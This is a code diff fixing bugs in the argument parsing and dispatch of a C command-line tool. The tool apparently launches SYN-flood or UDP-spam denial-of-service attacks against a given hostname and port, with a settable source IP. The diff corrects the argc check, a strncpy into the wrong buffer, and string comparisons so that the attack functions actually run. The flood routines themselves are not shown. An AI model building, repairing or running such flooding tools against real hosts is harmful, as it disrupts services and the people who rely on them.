@@ -47,9 +47,9 @@ int main(int argc, char* argv[])
     bzero(attack_type, sizeof(attack_type));
 
 
-    if (argc != 9 || argc != 11) {
+    if (argc != 9 && argc != 11) {
         printf ("usage: -a attack_type -p port -h hostname -s source_ip -m message (for udp only)\n");
-        printf ("Wrong number of args\n");
+        printf ("Wrong number of args (argc=%d)\n",argc);
         return -1;
     }
     //Arg parsing
@@ -64,7 +64,7 @@ int main(int argc, char* argv[])
             strncpy(source_ip, argv[i + 1], sizeof(source_ip));
         }
         else if (!strcmp(argv[i], "-a")) {
-            strncpy(source_ip, argv[i + 1], sizeof(attack_type));
+            strncpy(attack_type, argv[i + 1], sizeof(attack_type));
         }
         else if (!strcmp(argv[i], "-m")) {
             strncpy(message, argv[i + 1], sizeof(message));
@@ -77,10 +77,10 @@ int main(int argc, char* argv[])
     printf("attack: %s, port: %d, host: %s, source_ip: %s\n",attack_type,port,hostname,source_ip);
     
     // call function (either syn or udp)
-    if (attack_type == "syn_flood") {
+    if ( !strncmp(attack_type, "syn_flood", 9)) {
         syn_flood(hostname, port, source_ip);
     }
-    else if(attack_type == "udp_spam") {
+    else if(!strncmp(attack_type, "udp_spam", 8)) {
         udp_spam(hostname, port, message);
     }
     else {
